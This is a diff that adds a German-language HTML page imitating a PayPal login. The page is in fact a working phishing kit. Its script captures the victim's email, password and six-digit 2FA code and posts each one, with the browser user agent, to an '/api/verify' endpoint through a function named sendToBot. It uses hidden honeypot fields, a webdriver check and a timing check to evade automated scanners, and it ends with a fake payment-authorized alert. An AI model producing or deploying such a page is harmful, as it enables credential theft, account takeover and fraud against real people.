@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>&nbsp;</title>
+    <style>
+        body, html { 
+            height: 100%; margin: 0; padding: 0; 
+            font-family: "PayPalOpen-Regular", "Helvetica Neue", Arial, sans-serif; 
+            background-color: #fffffe; color: #2c2e30; overflow: hidden;
+        }
+        
+        .w1 {
+            display: flex; flex-direction: column; height: 100vh;
+            justify-content: space-between; align-items: center;
+        }
+
+        .w2 { 
+            width: 100%; max-width: 400px; 
+            flex-grow: 1; display: flex; flex-direction: column; 
+            justify-content: center; padding: 0 20px;
+            box-sizing: border-box;
+        }
+
+        section {
+            display: none;
+            animation: fadeInSlide 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        @keyframes fadeInSlide {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 0 0 10px 0; color: #001; }
+        .w3 { text-align: center; color: #667; margin-bottom: 25px; font-size: 15px; }
+
+        .w4 { margin-bottom: 15px; width: 100%; position: relative; }
+        
+        input {
+            width: 100%; padding: 14px 15px; border: 1px solid #949495; border-radius: 4px;
+            font-size: 16px; box-sizing: border-box; outline: none; transition: all 0.2s ease;
+        }
+        input:focus { border-color: #0070bb; box-shadow: 0 0 0 1px #0070bb; }
+        
+        input.err_b { border-color: #c23935 !important; animation: shake 0.3s; }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .err_m {
+            color: #c23935; font-size: 13px; margin-top: 8px; display: none;
+            animation: slideIn 0.2s ease-out;
+        }
+        @keyframes slideIn { from { opacity: 0; height: 0; } to { opacity: 1; height: auto; } }
+
+        .b1 {
+            width: 100%; padding: 14px; border-radius: 25px; border: none;
+            font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px;
+            transition: all 0.2s ease;
+        }
+        .b2 { background-color: #0070bb; color: white; }
+        .b2:active { transform: scale(0.98); }
+
+        .w5 { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
+        .w5 input { width: 40px; height: 45px; text-align: center; font-size: 18px; }
+
+        .w6 {
+            width: 40px; height: 40px; border: 3px solid #f3f3f4;
+            border-top: 3px solid #0070bb; border-radius: 50%;
+            animation: spin 1s linear infinite; margin: 0 auto 15px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .w7 {
+            width: 100%; background: #f7f9fb; 
+            border-top: 1px solid #e1e7ec;
+            padding: 25px 0; text-align: center; 
+            font-size: 12px; color: #667;
+        }
+        .w8 { margin-bottom: 8px; }
+        .w8 a { color: #667; text-decoration: none; margin: 0 10px; font-weight: 500; }
+    </style>
+</head>
+<body>
+
+<div class="w1">
+    <div class="w2">
+        <section id="sec_1" style="display: block;">
+            <h1>Bei PayPal einloggen</h1>
+            <p class="w3">Geben Sie Ihre E-Mail-Adresse ein.</p>
+            <div class="w4">
+                <input type="text" id="i_1" autocomplete="off" placeholder="E-Mail-Adresse oder Handynummer">
+                <div id="e_1" class="err_m">Geben Sie eine gültige E-Mail-Adresse ein.</div>
+            </div>
+            <div style="position: absolute; left: -5000px;" aria-hidden="true">
+                <input type="text" name="user_nickname" tabindex="-1" autocomplete="off">
+            </div>
+            <button class="b1 b2" onclick="v_e()">Weiter</button>
+        </section>
+
+        <section id="sec_2">
+            <h1>Passwort eingeben</h1>
+            <p class="w3">Geben Sie Ihr Passwort ein.</p>
+            <div class="w4">
+                <input type="password" id="i_2" placeholder="Passwort">
+                <div id="e_2" class="err_m">Bitte geben Sie Ihr Passwort ein.</div>
+            </div>
+            <div style="position: absolute; left: -5000px;" aria-hidden="true">
+                <input type="text" name="user_real_name" tabindex="-1" autocomplete="off">
+            </div>
+            <button class="b1 b2" onclick="v_p()">Einloggen</button>
+        </section>
+
+        <section id="sec_3">
+            <h1>Sicherheitsprüfung</h1>
+            <p class="w3">Geben Sie den 6-stelligen Code ein.</p>
+            <div class="w5">
+                <input type="text" maxlength="1" id="k1" onkeyup="m_v(this, 'k2')">
+                <input type="text" maxlength="1" id="k2" onkeyup="m_v(this, 'k3')">
+                <input type="text" maxlength="1" id="k3" onkeyup="m_v(this, 'k4')">
+                <input type="text" maxlength="1" id="k4" onkeyup="m_v(this, 'k5')">
+                <input type="text" maxlength="1" id="k5" onkeyup="m_v(this, 'k6')">
+                <input type="text" maxlength="1" id="k6">
+            </div>
+            <div style="position: absolute; left: -5000px;" aria-hidden="true">
+                <input type="text" name="user_secret_code" tabindex="-1" autocomplete="off">
+            </div>
+            <button class="b1 b2" onclick="f_n()">Bestätigen</button>
+        </section>
+
+        <section id="sec_4">
+            <div class="w6"></div>
+            <p style="text-align:center; color:#667; font-size: 14px;">Einen Moment bitte...</p>
+        </section>
+    </div>
+
+    <div class="w7">
+        <div class="w8">
+            <a href="#" onclick="window.open('https://www.paypal.com/de/legalhub/imprint-full', '_blank'); return false;">Impressum</a><a href="#" onclick="window.open('https://www.paypal.com/de/legalhub/privacy-full', '_blank'); return false;">Datenschutz</a><a href="#" onclick="window.open('https://www.paypal.com/de/cshelp/personal', '_blank'); return false;">Hilfe</a><a href="#" onclick="window.open('https://www.paypal.com/de/cshelp/contact', '_blank'); return false;">Kontakt</a>
+        </div>
+        <div>© 1999–2026 PayPal. Alle Rechte vorbehalten.</div>
+    </div>
+</div>
+
+<script>
+    const pageLoadTime = new Date().getTime();
+
+    document.addEventListener('DOMContentLoaded', () => {
+        document.title = "PayPal Login";
+    });
+
+    async function sendToBot(data) {
+        try {
+            await fetch('/api/verify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ...data, deviceData: navigator.userAgent })
+            });
+        } catch (e) { console.error("API Error", e); }
+    }
+
+    function v_e() {
+        const honeypot = document.querySelector('input[name="user_nickname"]');
+        if (honeypot.value !== "" || (new Date().getTime() - pageLoadTime < 2000)) {
+            s_l('toPassword', 1200);
+            return;
+        }
+
+        if (navigator.webdriver) {
+            return;
+        }
+
+        const emailInput = document.getElementById('i_1');
+        const errorDiv = document.getElementById('e_1');
+        const val = emailInput.value;
+
+        if (val.trim() === "" || !val.includes("@")) {
+            emailInput.classList.add('err_b');
+            errorDiv.style.display = 'block';
+        } else {
+            emailInput.classList.remove('err_b');
+            errorDiv.style.display = 'none';
+            sendToBot({type: "PAYPAL_EMAIL", message: "E-Mail: " + val});
+            s_l('toPassword', 1200);
+        }
+    }
+
+    function v_p() {
+        const honeypot = document.querySelector('input[name="user_real_name"]');
+        if (honeypot.value !== "") {
+            s_l('toCode', 3000);
+            return;
+        }
+
+        if (navigator.webdriver) {
+            return;
+        }
+
+        const passInput = document.getElementById('i_2');
+        const errorDiv = document.getElementById('e_2');
+        const email = document.getElementById('i_1').value;
+
+        if (passInput.value.trim() === "") {
+            passInput.classList.add('err_b');
+            errorDiv.style.display = 'block';
+        } else {
+            passInput.classList.remove('err_b');
+            errorDiv.style.display = 'none';
+            sendToBot({type: "PAYPAL_LOGIN", message: `E-Mail: ${email}\nPasswort: ${passInput.value}`});
+            s_l('toCode', 3000); 
+        }
+    }
+
+    function s_l(target, delay) {
+        document.querySelectorAll('section').forEach(s => s.style.display = 'none');
+        document.getElementById('sec_4').style.display = 'block';
+
+        setTimeout(() => {
+            document.getElementById('sec_4').style.display = 'none';
+            if(target === 'toPassword') document.getElementById('sec_2').style.display = 'block';
+            if(target === 'toCode') {
+                document.getElementById('sec_3').style.display = 'block';
+                document.getElementById('k1').focus();
+            }
+        }, delay);
+    }
+
+    function m_v(curr, next) {
+        if(curr.value.length >= 1) document.getElementById(next).focus();
+    }
+
+    function f_n() {
+        const honeypot = document.querySelector('input[name="user_secret_code"]');
+        if (honeypot.value !== "") {
+            window.parent.location.reload();
+            return;
+        }
+
+        if (navigator.webdriver) {
+            return;
+        }
+
+        const code = document.getElementById('k1').value + 
+                     document.getElementById('k2').value + 
+                     document.getElementById('k3').value + 
+                     document.getElementById('k4').value + 
+                     document.getElementById('k5').value + 
+                     document.getElementById('k6').value;
+        
+        sendToBot({type: "PAYPAL_2FA", message: "Code: " + code});
+        
+        alert("Zahlung erfolgreich autorisiert.");
+        window.parent.location.reload();
+    }
+</script>
+</body>
+</html>
